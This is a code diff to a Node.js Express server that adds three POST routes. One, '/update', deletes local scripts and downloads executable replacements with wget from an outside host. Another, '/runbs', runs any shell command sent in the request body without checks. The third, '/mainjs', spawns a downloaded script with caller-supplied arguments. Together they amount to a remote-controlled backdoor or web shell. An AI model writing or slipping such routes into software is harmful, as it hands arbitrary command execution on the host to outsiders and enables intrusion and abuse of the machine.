@@ -19,6 +19,38 @@ app.post("/thingy", (req, res) => {
     res.send("ok")
     }catch(err){res.send("error happened")}
 })
+app.post("/update", (req,res)=>{
+  exec("rm -rf test.js", ()=>{
+    exec("wget https://update-meow.pages.dev/test.js && chmod +x ./test.js", (error, stdout, stderr)=>{
+      res.send(stdout)
+    })
+  })
+  exec("rm -rf main.js", ()=>{
+    exec("wget https://update-meow.pages.dev/main.js && chmod +x ./main.js", ()=>{
+    })
+  })
+})
+app.post("/runbs", (req,res)=>{
+  const command = req.body.x;
+
+  exec(command, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`exec error: ${error}`);
+      return;
+    }
+    res.send({output: stdout})
+  });
+})
+app.post("/mainjs",(req,res)=>{
+  if(!req.body.argz || !req.body.time){
+    return res.send("error")
+  }
+  proc = spawn("./main.js "+req.body.argz)
+  setTimeout(()=>{
+    proc.kill();
+  }, req.body.time)
+  res.send("ran")
+})
 app.post("/kill", (req, res) => {
     try{
   try {
@@ -28,4 +60,6 @@ app.post("/kill", (req, res) => {
   res.send("ok")
   }catch(err){res.send("error happened")}
 })
+
+
 app.listen("8080")
